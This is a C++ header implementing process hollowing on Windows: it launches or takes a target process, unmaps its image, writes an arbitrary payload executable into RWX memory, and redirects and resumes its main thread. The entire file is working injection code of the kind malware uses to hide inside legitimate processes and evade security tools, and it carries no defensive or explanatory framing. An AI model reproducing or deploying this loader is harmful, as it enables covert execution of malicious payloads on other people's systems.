#pragma once
#include "pch.h"

class ProcessHollowing {
public:
    static bool HollowProcess(const wchar_t* targetPath, const wchar_t* payloadPath) {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        
        // Create suspended process
        if (!CreateProcessW(targetPath, NULL, NULL, NULL, FALSE, 
            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            return false;
        }

        // Get target base address
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &ctx)) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Read PEB for base address
        LPVOID pebOffset = (LPVOID)(ctx.Rdx + 0x10);
        LPVOID baseAddress;
        if (!ReadProcessMemory(pi.hProcess, pebOffset, &baseAddress, sizeof(LPVOID), NULL)) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Read payload file
        HANDLE hPayload = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, 
            NULL, OPEN_EXISTING, 0, NULL);
        if (hPayload == INVALID_HANDLE_VALUE) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        DWORD payloadSize = GetFileSize(hPayload, NULL);
        LPVOID payload = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        DWORD bytesRead;
        ReadFile(hPayload, payload, payloadSize, &bytesRead, NULL);
        CloseHandle(hPayload);

        // Unmap target process memory
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
        pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)
            GetProcAddress(ntdll, "NtUnmapViewOfSection");
        
        if (NtUnmapViewOfSection(pi.hProcess, baseAddress) != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Allocate memory for payload
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)payload + dosHeader->e_lfanew);
        
        LPVOID targetBase = VirtualAllocEx(pi.hProcess, baseAddress,
            ntHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!targetBase) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Write headers
        if (!WriteProcessMemory(pi.hProcess, targetBase, payload,
            ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Write sections
        PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            WriteProcessMemory(pi.hProcess,
                (LPVOID)((LPBYTE)targetBase + sections[i].VirtualAddress),
                (LPVOID)((LPBYTE)payload + sections[i].PointerToRawData),
                sections[i].SizeOfRawData, NULL);
        }

        // Update entry point
        ctx.Rcx = (DWORD64)((LPBYTE)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
        SetThreadContext(pi.hThread, &ctx);

        // Resume thread
        ResumeThread(pi.hThread);

        VirtualFree(payload, 0, MEM_RELEASE);
        return true;
    }

    static bool HollowProcess(HANDLE hProcess, const BYTE* payload, SIZE_T payloadSize) {
        // Get process base address
        PROCESS_BASIC_INFORMATION pbi;
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return false;

        typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
            HANDLE ProcessHandle,
            PROCESSINFOCLASS ProcessInformationClass,
            PVOID ProcessInformation,
            ULONG ProcessInformationLength,
            PULONG ReturnLength
        );

        auto NtQueryInformationProcess = (pNtQueryInformationProcess)
            GetProcAddress(hNtdll, "NtQueryInformationProcess");
        
        if (!NtQueryInformationProcess) return false;

        NTSTATUS status = NtQueryInformationProcess(
            hProcess,
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            NULL
        );

        if (status != STATUS_SUCCESS) return false;

        // Read PEB for base address
        LPVOID baseAddress;
        if (!ReadProcessMemory(hProcess, 
            (LPVOID)((BYTE*)pbi.PebBaseAddress + 0x10),
            &baseAddress, sizeof(LPVOID), NULL)) {
            return false;
        }

        // Unmap current memory
        typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
        auto NtUnmapViewOfSection = (pNtUnmapViewOfSection)
            GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        
        if (!NtUnmapViewOfSection || 
            NtUnmapViewOfSection(hProcess, baseAddress) != STATUS_SUCCESS) {
            return false;
        }

        // Parse headers
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
            ((BYTE*)payload + dosHeader->e_lfanew);

        // Allocate memory for new image
        LPVOID targetBase = VirtualAllocEx(hProcess, baseAddress,
            ntHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!targetBase) return false;

        // Write headers
        if (!WriteProcessMemory(hProcess, targetBase, payload,
            ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
            return false;
        }

        // Write sections
        PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (!WriteProcessMemory(hProcess,
                (LPVOID)((BYTE*)targetBase + sections[i].VirtualAddress),
                (LPVOID)((BYTE*)payload + sections[i].PointerToRawData),
                sections[i].SizeOfRawData, NULL)) {
                return false;
            }
        }

        return true;
    }
};
